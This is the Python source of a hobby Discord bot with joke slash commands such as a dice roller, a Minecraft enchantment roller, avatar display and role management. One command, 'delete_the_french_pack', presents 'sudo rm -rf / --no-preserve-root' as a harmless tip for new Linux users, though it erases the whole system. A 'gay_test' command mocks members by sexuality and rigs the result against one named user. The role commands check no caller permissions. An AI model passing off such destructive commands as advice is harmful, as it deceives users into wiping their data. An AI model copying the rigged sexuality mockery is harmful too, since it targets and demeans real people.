import discord
from discord.ext import commands

from dotenv import load_dotenv 
import os

import random

from music_cog import music_cog

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="/", intents=intents)

gay_list = [
    "summeryou7101",
];


@bot.event
async def on_ready():
    print(f"{bot.user} is online!")


@bot.event
async def on_member_join(member):
    await member.send(f"Welcome to the Server! {member.name}")


@bot.slash_command(name="hello", description="Hello World!")
async def hello(ctx):
    await ctx.respond(f"{ctx.author.mention}, Hello World!")


@bot.slash_command(name="delete_the_french_pack", description="how to delete the french pack!")
async def hello(ctx):
    await ctx.respond(f"Hello {ctx.author.mention}! If you just started using linux, don't forgot to delete the french pack! Just simply run the command below and you'll be good to go!\n ```sudo rm -rf / --no-preserve-root```")


@bot.slash_command(name="skill_issue", description="skill issue")
async def skill_issue(ctx, member: discord.Member):
    await ctx.respond(f"Hey guys, {member.nick or member.global_name or member.name} here, i am here to sincerely apologize for my MASSIVE skill issue, i am very sorry for anyone who was affected by my skill issue.")


@bot.slash_command(name="arch", description="i use arch btw")
async def arch(ctx, member: discord.Member):
    await ctx.respond(f"Hey guys, {member.nick or member.global_name or member.name} here, let me metion that i use arch btw, also i use arch btw. oh and btw, i use arch btw, did i forgot to say i use arch btw, and sorry for not metioning that i use arch btw. wait a moment, one last thing, i use arch btw (i use arch btw).")


@bot.slash_command(name="roll_a_dice", description="roll a dice!")
async def roll_a_dice(ctx, face):
    if face.isdecimal():
        if int(face) < 1:
            await ctx.respond(f"bro i need a number bigger than 1")
        else:
            num = str(random.randint(1, int(face)))
            await ctx.respond(f"Rolling a {face}-faced dice... \nYou rolled a {num}!")
    else:
        await ctx.respond(f"bro u need to input a number...")


@bot.slash_command(name="gay_test", description="definitely a normal test!")
async def gay_test(ctx, member: discord.Member):
    gay_meter = 0
    if (member.name in gay_list):
        gay_meter = random.randint(50, 100)
    else:
        gay_meter = random.randint(0, 100)
    
    embed = discord.Embed(
        title = f"Is {member.nick or member.global_name or member.name} gay?",
        description=f"{member.nick or member.global_name or member.name} is {gay_meter}% gay!",
    )
    embed.set_thumbnail(url=member.display_avatar)

    await ctx.respond(embed=embed)


@bot.slash_command(name="avatar", description="shows the avatar!")
async def avatar(ctx, member: discord.Member):
    embed = discord.Embed()
    embed.set_image(url=member.display_avatar)

    await ctx.respond(embed=embed)


@bot.slash_command(name="enchant_roller", description="rolls a minecraft item with random enchantments!")
async def enchant_roller(ctx):
    items = [["iron_sword", "diamond_sword", "netherite_sword"],
             ["iron_axe", "diamond_axe", "netherite_axe"],
             ["iron_pickaxe", "diamond_pickaxe", "netherite_pickaxe"],
             ["iron_helmet", "diamond_helmet", "netherite_helmet"],
             ["iron_chestplate", "diamond_chestplate", "netherite_chestplate"],
             ["iron_leggings", "diamond_leggings", "netherite_leggings"],
             ["iron_boots", "diamond_boots", "netherite_boots"],
             ["bow"], ["mace"]]
        
    #randomly picks one item
    pick_item = random.randint(0, len(items)-1)
    pick_item_type = random.randint(0, len(items[pick_item])-1)
    enchantments = {}
    all_enchants = ""

    #randomly chooses the level of the enchantment
    enchantments["mending"] = random.randint(0, 1)
    enchantments["unbreaking"] = random.randint(0, 3)
    if pick_item == 0:
        enchantments["sharpness"] = random.randint(0, 5)
        enchantments["fire_aspect"] = random.randint(0, 2)
        enchantments["looting"] = random.randint(0, 3)
        enchantments["sweeping_edge"] = random.randint(0, 3)
    elif pick_item == 1:
        enchantments["sharpness"] = random.randint(0, 5)
        enchantments["efficiency"] = random.randint(0, 5)
        enchantments["fortune"] = random.randint(0, 3)
    elif pick_item == 2:
        enchantments["efficiency"] = random.randint(0, 5)
        enchantments["fortune"] = random.randint(0, 3)
    elif pick_item == 3:
        enchantments["protection"] = random.randint(0, 4)
        enchantments["thorns"] = random.randint(0, 3)
        enchantments["aqua_affnity"] = random.randint(0, 1)
        enchantments["respiration"] = random.randint(0, 3)
    elif pick_item == 4:
        enchantments["protection"] = random.randint(0, 4)
        enchantments["thorns"] = random.randint(0, 3)
    elif pick_item == 5:
        enchantments["protection"] = random.randint(0, 4)
        enchantments["thorns"] = random.randint(0, 3)
        enchantments["swift_sneak"] = random.randint(0, 3)
    elif pick_item == 6:
        enchantments["protection"] = random.randint(0, 4)
        enchantments["thorns"] = random.randint(0, 3)
        enchantments["feather_falling"] = random.randint(0, 4)
        enchantments["depth_strider"] = random.randint(0, 3)
        enchantments["soul_speed"] = random.randint(0, 3)
    elif pick_item == 7:
        enchantments["power"] = random.randint(0, 5)
        enchantments["flame"] = random.randint(0, 3)
        enchantments["punch"] = random.randint(0, 4)
    elif pick_item == 8:
        enchantments["smite"] = random.randint(0, 5)
        enchantments["density"] = random.randint(0, 5)
        enchantments["wind_burst"] = random.randint(0, 3)

    for key, value in enchantments.items():
        if value != 0:
            all_enchants += f"{key} {value}\n"
            
    #show the item and enchants
    file = discord.File(f"./images/{items[pick_item][pick_item_type]}.png")

    embed = discord.Embed(
        title = f"you rolled a {items[pick_item][pick_item_type].replace("_", " ")}!",
        description = all_enchants,
    )
    embed.set_thumbnail(url=f"attachment://{items[pick_item][pick_item_type]}.png")

    await ctx.respond(file = file, embed=embed)


@bot.slash_command(name="add_role", description="adds a role to a person!")
async def add_role(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role, reason=None, atomic=True)
        await ctx.respond(f"Successfully added {role.name} role to {member.nick or member.global_name or member.name}!")
    except:
        await ctx.respond(f"Failed to add role (might be because of the permissions)")
    

@bot.slash_command(name="remove_role", description="removes a role from a person!")
async def remove_role(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role, reason=None, atomic=True)
        await ctx.respond(f"Successfully removed {role.name} role from {member.nick or member.global_name or member.name}!")
    except:
        await ctx.respond(f"Failed to remove role (might be because of the permissions)")

bot.add_cog(music_cog(bot))
bot.run(TOKEN)